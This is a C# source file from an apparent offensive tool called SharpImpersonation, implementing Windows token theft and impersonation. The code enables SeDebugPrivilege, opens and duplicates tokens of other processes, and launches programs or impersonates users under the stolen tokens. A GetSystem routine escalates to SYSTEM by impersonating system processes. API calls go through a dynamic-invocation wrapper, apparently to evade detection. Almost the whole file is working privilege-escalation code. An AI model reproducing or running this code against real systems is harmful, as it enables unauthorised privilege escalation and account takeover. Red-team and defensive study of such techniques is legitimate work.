using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace SharpImpersonation
{

    class Tokens : IDisposable
    {

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean GetTokenInformation(IntPtr TokenHandle, _TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern Boolean GetTokenInformation(IntPtr TokenHandle, _TOKEN_INFORMATION_CLASS TokenInformationClass, ref _TOKEN_STATISTICS TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);



        protected IntPtr phNewToken;
        protected IntPtr hExistingToken;
        private IntPtr currentProcessToken;
        private Dictionary<UInt32, String> processes;

        internal delegate Boolean Create(IntPtr phNewToken, String newProcess, String arguments);

        public static List<String> validPrivileges = new List<string> { "SeAssignPrimaryTokenPrivilege",
            "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
            "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
            "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
            "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
            "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
            "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };

 
        ////////////////////////////////////////////////////////////////////////////////
        // Default Constructor
        ////////////////////////////////////////////////////////////////////////////////
        public Tokens()
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<UInt32, String>();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine("[-] Administrator privileges required");
            }

            currentProcessToken = new IntPtr();

            // OpenProcessToken args
            object[] OpenProcessTokenArgs =
            {
                Process.GetCurrentProcess().Handle,
                Constants.TOKEN_ALL_ACCESS,
                currentProcessToken
            };
            
            bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcessToken", typeof(OpenProcessToken), ref OpenProcessTokenArgs, true, true);
            currentProcessToken = (IntPtr)OpenProcessTokenArgs[2];

            //managed.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
            SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME, Token.TokenPrivileges.SE_PRIVILEGE_ENABLED);
        }

        protected Tokens(Boolean rt)
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<UInt32, String>();

            currentProcessToken = new IntPtr();
            
            // OpenProcessToken args
            object[] OpenProcessTokenArgs =
            {
                Process.GetCurrentProcess().Handle,
                Constants.TOKEN_ALL_ACCESS,
                currentProcessToken
            };
            bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcessToken", typeof(OpenProcessToken), ref OpenProcessTokenArgs, true, true);
            currentProcessToken = (IntPtr)OpenProcessTokenArgs[2];

        }

        public void Dispose()
        {
            object[] CloseHandleNewArgs = {phNewToken};
            object[] CloseHandleExistingArgs = { hExistingToken };
            if (IntPtr.Zero != phNewToken)
                InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleNewArgs, true, true);
                //kernel32.CloseHandle(phNewToken);
            if (IntPtr.Zero != hExistingToken)
                InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleExistingArgs, true, true);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Default Destructor
        ////////////////////////////////////////////////////////////////////////////////
        ~Tokens()
        {
            Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Calls CreateProcessWithTokenW
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean StartProcessAsUser(Int32 processId, String newProcess)
        {
            Console.WriteLine("[*] Stealing token from ProcID: " + processId + " to start binary: " + newProcess);
            bool success = GetPrimaryToken((UInt32)processId, "");
            if (!(success))
            {
                Console.WriteLine("[-] GetPrimaryToken failed!");
            }
            if (hExistingToken == IntPtr.Zero)
            {
                Console.WriteLine("Existing token zero");

                return false;
            }
            
            _SECURITY_ATTRIBUTES securityAttributes = new _SECURITY_ATTRIBUTES();
            object[] DuplicateTokenExArgs = { hExistingToken,(UInt32)ACCESS_MASK.MAXIMUM_ALLOWED,securityAttributes,_SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,_TOKEN_TYPE.TokenPrimary,phNewToken };
            success = false;
            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "DuplicateTokenEx", typeof(DuplicateTokenExLong), ref DuplicateTokenExArgs, true, true);
            if (success)
            {
                phNewToken = (IntPtr)DuplicateTokenExArgs[5];


            }
            else
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));

            Create createProcess;
            if (0 == Process.GetCurrentProcess().SessionId)
            {
                createProcess = CreateProcess.CreateProcessWithLogonW;
            }
            else
            {
                createProcess = CreateProcess.CreateProcessWithTokenW;
            }
            String arguments = String.Empty;
            FindExe(ref newProcess, out arguments);
            string priv = "SeAuditPrivilege";
            phNewToken = SetTokenPrivilegeTest(ref phNewToken, priv, Token.TokenPrivileges.SE_PRIVILEGE_ENABLED);
            
            if (!createProcess(phNewToken, newProcess, arguments))
            {
                return false;
            }
            return true;
        }

        protected void FindExe(ref String command, out String arguments)
        {
            arguments = "";
            if (command.Contains(" "))
            {
                String[] commandAndArguments = command.Split(new String[] { " " }, StringSplitOptions.RemoveEmptyEntries);
                command = commandAndArguments.First();
                arguments = String.Join(" ", commandAndArguments.Skip(1).Take(commandAndArguments.Length - 1).ToArray());
            }
        }


        ////////////////////////////////////////////////////////////////////////////////
        // Impersonates the token from a specified processId via SetThreadToken
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean SetThreadToken(Int32 processId)
        {
            Console.WriteLine("[*] Impersonating {0}", processId);
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }

            IntPtr dulicateTokenHandle = IntPtr.Zero;
            object[] DuplicateTokenArgs = { hExistingToken, 2, dulicateTokenHandle };
            bool success = false;
            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "DuplicateToken", typeof(DuplicateToken), ref DuplicateTokenArgs, true, true);

            if (success)
            {
                phNewToken = (IntPtr)DuplicateTokenArgs[2];
            }
            else
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));

            IntPtr CurrentThread = IntPtr.Zero;

            object[] SetThreadTokenArgs = { IntPtr.Zero, phNewToken };
            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "SetThreadToken", typeof(SetThreadToken), ref SetThreadTokenArgs, true, true);

            if (success)
            {
                Console.WriteLine(" [+] Successfully set Token for the current process!");
                Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                return true;
            }
            else
            {
                Console.WriteLine(" [+] SetThreadToken failed!");
                GetWin32Error("Error code: ");
                return false;
            }

        }

        public static void ThreadStart()
        {
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Impersonates the token from a specified processId
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean ImpersonateUser(Int32 processId)
        {
            Console.WriteLine("[*] Impersonating {0}", processId);
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            _SECURITY_ATTRIBUTES securityAttributes = new _SECURITY_ATTRIBUTES();
            object[] DuplicateTokenExArgs = {hExistingToken,(UInt32)ACCESS_MASK.MAXIMUM_ALLOWED,securityAttributes,_SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,_TOKEN_TYPE.TokenPrimary,phNewToken };
            bool success = false;
            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "DuplicateTokenEx", typeof(DuplicateTokenExLong), ref DuplicateTokenExArgs, true, true);
            if (success)
            {
                phNewToken = (IntPtr)DuplicateTokenExArgs[5];
            }
            else
            {
                GetWin32Error("DuplicateTokenEx: ");
                return false;
            }
            Console.WriteLine(" [+] Duplicate Token Handle: 0x{0}", phNewToken.ToString("X4"));
            object[] ImpersonateLoggedOnUserArgs = { phNewToken };
            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "ImpersonateLoggedOnUser", typeof(ImpersonateLoggedOnUser), ref ImpersonateLoggedOnUserArgs, true, true);
            if (!(success))
            {
                GetWin32Error("ImpersonateLoggedOnUser: ");
                return false;
            }
            Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Elevates current process to SYSTEM
        ////////////////////////////////////////////////////////////////////////////////
        public Boolean GetSystem()
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
            processes = Enumeration.EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (UInt32 process in processes.Keys)
            {
                if (ImpersonateUser((Int32)process))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets hToken to a processes primary token
        ////////////////////////////////////////////////////////////////////////////////
        public virtual Boolean GetPrimaryToken(UInt32 processId, String name)
        {
            //Originally Set to true
            object[] OpenProcessArgs = { Constants.PROCESS_QUERY_INFORMATION, true, processId };
            IntPtr hProcess = (IntPtr)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(OpenProcess), ref OpenProcessArgs, true, true);
            if (hProcess == IntPtr.Zero)
            {
                return false;
            }
            Console.WriteLine("[+] Recieved Handle for: {0} ({1})", name, processId);
            Console.WriteLine(" [+] Process Handle: 0x{0}", hProcess.ToString("X4"));

            object[] OpenProcessTokenArgs = { hProcess, Constants.TOKEN_ALT, hExistingToken };
            bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcessToken", typeof(OpenProcessToken), ref OpenProcessTokenArgs, true, true);
            if (success) 
            {
                hExistingToken = (IntPtr)OpenProcessTokenArgs[2];
            }
            else
            {
                Console.WriteLine(@"[-] Could not open Process Token, trying as SYSTEM ¯\_(ツ)_/¯ ");
                GetSystem();
                object[] OpenProcessTokenSystemArgs = { hProcess, Constants.TOKEN_ALT, hExistingToken };
                success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenProcessToken", typeof(OpenProcessToken), ref OpenProcessTokenSystemArgs, true, true);
                hExistingToken = (IntPtr)OpenProcessTokenSystemArgs[2];
                if (!(success))
                {
                    Console.WriteLine(@"[-] Still failed :-(");
                    return false;
                }
            }
            Console.WriteLine("[+] Primary Token Handle: 0x{0}", hExistingToken.ToString("X4"));
            object[] CloseHandleArgs = { hProcess };
            InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref CloseHandleArgs, true, true);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Opens a thread token
        ////////////////////////////////////////////////////////////////////////////////
        private static IntPtr OpenThreadTokenChecked()
        {
            IntPtr hToken = new IntPtr();
            Console.WriteLine("[*] Opening Thread Token");
            object[] GetCurrentThreadArgs = { };
            IntPtr CurrentThread = (IntPtr)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "GetCurrentThread", typeof(GetCurrentThread), ref GetCurrentThreadArgs, true, true);
            object[] OpenThreadTokenArgs = { CurrentThread, (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, hToken };
            var success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenThreadToken", typeof(OpenThreadToken), ref OpenThreadTokenArgs, true, true);
            if (!(success))
            {
                Console.WriteLine(" [-] OpenTheadToken Failed");
                Console.WriteLine(" [*] Impersonating Self");
                object[] ImpersonateSelfArgs = { _SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation };
                success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "ImpersonateSelf", typeof(ImpersonateSelf), ref ImpersonateSelfArgs, true, true);
                if (!(success))
                {
                    GetWin32Error("ImpersonateSelf");
                    return IntPtr.Zero;
                }
                Console.WriteLine(" [+] Impersonated Self");
                Console.WriteLine(" [*] Retrying");
                object[] GetCurrentThread2Args = { };
                IntPtr CurrentThread2 = (IntPtr)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "GetCurrentThread", typeof(GetCurrentThread), ref GetCurrentThread2Args, true, true);
                object[] OpenThreadToken2Args = { CurrentThread2, (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, hToken };
                success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("kernel32.dll", "OpenThreadToken", typeof(OpenThreadToken), ref OpenThreadToken2Args, true, true);
                if (!(success))
                {
                    GetWin32Error("OpenThreadToken");
                    return IntPtr.Zero;
                }
            }
            Console.WriteLine(" [+] Recieved Thread Token Handle: 0x{0}", hToken.ToString("X4"));
            return hToken;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets a Token to have a specified privilege
        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public static void SetTokenPrivilege(ref IntPtr hToken, String privilege, Token.TokenPrivileges attribute)
        {
            if (!validPrivileges.Contains(privilege))
            {
                Console.WriteLine("[-] Invalid Privilege Specified");
                return;
            }

            Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            _LUID luid = new _LUID();

            // LookupPrivilegeValue args
            object[] LookupPrivilegeValueArgs =
            {
                null,
                privilege,
                luid
            };
            Console.WriteLine(privilege);
            bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "LookupPrivilegeValueA", typeof(LookupPrivilegeValue), ref LookupPrivilegeValueArgs, true, true);

            if (!(success))
            {
                GetWin32Error("LookupPrivilegeValue");
                return;
            }
            Console.WriteLine(" [+] Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            _LUID_AND_ATTRIBUTES luidAndAttributes = new _LUID_AND_ATTRIBUTES
            {
                Luid = luid,
                Attributes = (uint)attribute
            };
            _TOKEN_PRIVILEGES newState = new _TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = luidAndAttributes
            };
            _TOKEN_PRIVILEGES previousState = new _TOKEN_PRIVILEGES();
            Console.WriteLine(" [*] AdjustTokenPrivilege");
            UInt32 returnLength = 0;

            // AdjustTokenPrivileges args
            object[] AdjustTokenPrivilegesArgs =
            {
               hToken, false, newState, (UInt32)Marshal.SizeOf(newState), previousState, returnLength
            };

            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "AdjustTokenPrivileges", typeof(AdjustTokenPrivileges), ref AdjustTokenPrivilegesArgs, true, true);
            returnLength = (UInt32)AdjustTokenPrivilegesArgs[5];
            if (!(success))
            {
                GetWin32Error("AdjustTokenPrivileges");
                return;
            }


            Console.WriteLine(" [+] Adjusted Privilege: {0}", privilege);
            Console.WriteLine(" [+] Privilege State: {0}", attribute);
            return;
        }

        // temporary testing purpose
        public static IntPtr SetTokenPrivilegeTest(ref IntPtr hToken, String privilege, Token.TokenPrivileges attribute)
        {
            if (!validPrivileges.Contains(privilege))
            {
                Console.WriteLine("[-] Invalid Privilege Specified");
                return IntPtr.Zero;
            }

            Console.WriteLine("[*] Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            _LUID luid = new _LUID();

            // LookupPrivilegeValue args
            object[] LookupPrivilegeValueArgs =
            {
                null,
                privilege,
                luid
            };
            Console.WriteLine(privilege);
            bool success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "LookupPrivilegeValueA", typeof(LookupPrivilegeValue), ref LookupPrivilegeValueArgs, true, true);

            if (!(success))
            {
                GetWin32Error("LookupPrivilegeValue");
                return IntPtr.Zero;
            }
            Console.WriteLine(" [+] Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            _LUID_AND_ATTRIBUTES luidAndAttributes = new _LUID_AND_ATTRIBUTES
            {
                Luid = luid,
                Attributes = (uint)attribute
            };
            _TOKEN_PRIVILEGES newState = new _TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = luidAndAttributes
            };
            _TOKEN_PRIVILEGES previousState = new _TOKEN_PRIVILEGES();
            Console.WriteLine(" [*] AdjustTokenPrivilege");
            UInt32 returnLength = 0;

            // AdjustTokenPrivileges args
            object[] AdjustTokenPrivilegesArgs =
            {
               hToken, false, newState, (UInt32)Marshal.SizeOf(newState), previousState, returnLength
            };

            success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "AdjustTokenPrivileges", typeof(AdjustTokenPrivileges), ref AdjustTokenPrivilegesArgs, true, true);
            returnLength = (UInt32)AdjustTokenPrivilegesArgs[5];
            if (!(success))
            {
                GetWin32Error("AdjustTokenPrivileges");
                return IntPtr.Zero;
            }


            Console.WriteLine(" [+] Adjusted Privilege: {0}", privilege);
            Console.WriteLine(" [+] Privilege State: {0}", attribute);
            return hToken;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets a Token to have a specified privilege
        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        public static void NukeTokenPrivilege(ref IntPtr hToken)
        {
            _TOKEN_PRIVILEGES newState = new _TOKEN_PRIVILEGES();
            _TOKEN_PRIVILEGES previousState = new _TOKEN_PRIVILEGES();
            Console.WriteLine(" [*] AdjustTokenPrivilege");
            UInt32 returnLength = 0;
            object[] AdjustTokenPrivilegesArgs =
{
               hToken, true, newState, (UInt32)Marshal.SizeOf(typeof(_TOKEN_PRIVILEGES)), previousState, returnLength
            };

            var success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "AdjustTokenPrivileges", typeof(AdjustTokenPrivileges), ref AdjustTokenPrivilegesArgs, true, true);
            returnLength = (UInt32)AdjustTokenPrivilegesArgs[5];
            if (!(success))
            {
                GetWin32Error("AdjustTokenPrivileges");
            }
            return;
        }


        ////////////////////////////////////////////////////////////////////////////////
        // Prints the tokens privileges
        ////////////////////////////////////////////////////////////////////////////////
        public static void EnumerateTokenPrivileges(IntPtr hToken)
        {
            ////////////////////////////////////////////////////////////////////////////////
            Console.WriteLine("[*] Enumerating Token Privileges");
            UInt32 TokenInfLength = 0;
            GetTokenInformation(hToken, _TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, 0, out TokenInfLength);
       
            if (TokenInfLength < 0 || TokenInfLength > Int32.MaxValue)
            {
                GetWin32Error("GetTokenInformation - 1 " + TokenInfLength);
                return;
            }
            Console.WriteLine("[*] GetTokenInformation - Pass 1");
            IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength);

            ////////////////////////////////////////////////////////////////////////////////

            object[] GetTokenInformationArgs2 =
            {
               hToken, _TOKEN_INFORMATION_CLASS.TokenPrivileges, lpTokenInformation, TokenInfLength, TokenInfLength
            };

            if (!GetTokenInformation(hToken, _TOKEN_INFORMATION_CLASS.TokenPrivileges, lpTokenInformation, TokenInfLength, out TokenInfLength))
            {
                GetWin32Error("GetTokenInformation - 2 " + TokenInfLength);
                return;
            }
            Console.WriteLine("[*] GetTokenInformation - Pass 2");
            _TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (_TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(_TOKEN_PRIVILEGES_ARRAY));
            Marshal.FreeHGlobal(lpTokenInformation);
            Console.WriteLine("[+] Enumerated {0} Privileges", tokenPrivileges.PrivilegeCount);
            Console.WriteLine();
            Console.WriteLine("{0,-45}{1,-30}", "Privilege Name", "Enabled");
            Console.WriteLine("{0,-45}{1,-30}", "--------------", "-------");
            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < tokenPrivileges.PrivilegeCount; i++)
            {
                StringBuilder lpName = new StringBuilder();
                Int32 cchName = 0;
                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
                Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);

                object[] LookupPrivilegeNameArgs =
                {
                    null, lpLuid, null, cchName
                };

                var success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "LookupPrivilegeName", typeof(LookupPrivilegeName), ref LookupPrivilegeNameArgs, true, true);

                if (cchName <= 0 || cchName > Int32.MaxValue)
                {
                    GetWin32Error("LookupPrivilegeName Pass 1");
                    Marshal.FreeHGlobal(lpLuid);
                    continue;
                }

                lpName.EnsureCapacity(cchName + 1);

                object[] LookupPrivilegeNameArgs2 =
                {
                    null, lpLuid, lpName, cchName
                };

                success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "LookupPrivilegeName", typeof(LookupPrivilegeName), ref LookupPrivilegeNameArgs2, true, true);

                if (!(success))
                {
                    GetWin32Error("LookupPrivilegeName Pass 2");
                    Marshal.FreeHGlobal(lpLuid);
                    continue;
                }

                _PRIVILEGE_SET privilegeSet = new _PRIVILEGE_SET
                {
                    PrivilegeCount = 1,
                    Control = Token.PRIVILEGE_SET_ALL_NECESSARY,
                    Privilege = new _LUID_AND_ATTRIBUTES[] { tokenPrivileges.Privileges[i] }
                };

                Int32 pfResult = 0;

                object[] PrivilegeCheckArgs =
                {
                    hToken, privilegeSet, pfResult
                };

                success = (bool)InvokeItDynamically.DynGen.DynamicAPIInvoke("advapi32.dll", "PrivilegeCheck", typeof(PrivilegeCheck2), ref PrivilegeCheckArgs, true, true);
                pfResult = (int)PrivilegeCheckArgs[2];

                if (!(success))
                {
                    GetWin32Error("PrivilegeCheck");
                    Marshal.FreeHGlobal(lpLuid);
                    continue;
                }
                Console.WriteLine("{0,-45}{1,-30}", lpName.ToString(), Convert.ToBoolean(pfResult));
                Marshal.FreeHGlobal(lpLuid);
            }
            Console.WriteLine();
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetNtError(String location, UInt32 ntError)
        {
            object[] RtlNtStatusToDosErrorArgs =
             {
                    ntError
              };

            UInt32 win32Error = (UInt32)InvokeItDynamically.DynGen.DynamicAPIInvoke("ntdll.dll", "RtlNtStatusToDosError", typeof(RtlNtStatusToDosError), ref RtlNtStatusToDosErrorArgs, true, true);

            Console.WriteLine(" [-] Function {0} failed: ", location);
            Console.WriteLine(" [-] {0}", new System.ComponentModel.Win32Exception((Int32)win32Error).Message);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public static void GetWin32Error(String location)
        {
            Console.WriteLine(" [-] Function {0} failed: ", location);
            Console.WriteLine(" [-] {0}", new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
        }
    }
}
